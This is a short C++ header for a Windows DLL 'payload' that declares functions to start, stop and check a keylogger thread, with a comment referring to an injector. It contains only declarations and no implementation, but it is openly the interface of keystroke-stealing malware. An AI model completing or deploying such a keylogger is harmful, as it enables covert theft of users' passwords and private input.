#pragma once

#include <Windows.h>

// Define export/import macro
#ifdef PAYLOAD_EXPORTS
#define PAYLOAD_API __declspec(dllexport)
#else
#define PAYLOAD_API __declspec(dllimport)
#endif

// Keylogger thread function (usually not exported, called internally)
// If you intend to call this from Injector, you would export it, but typically DLLs expose public APIs.
DWORD WINAPI KeyloggerThread(LPVOID lpParam); 

// Start the keylogger thread
PAYLOAD_API bool StartKeylogger();

// Stop the keylogger thread
PAYLOAD_API void StopKeylogger();

// Check if keylogger is currently running
PAYLOAD_API bool IsKeyloggerRunning();
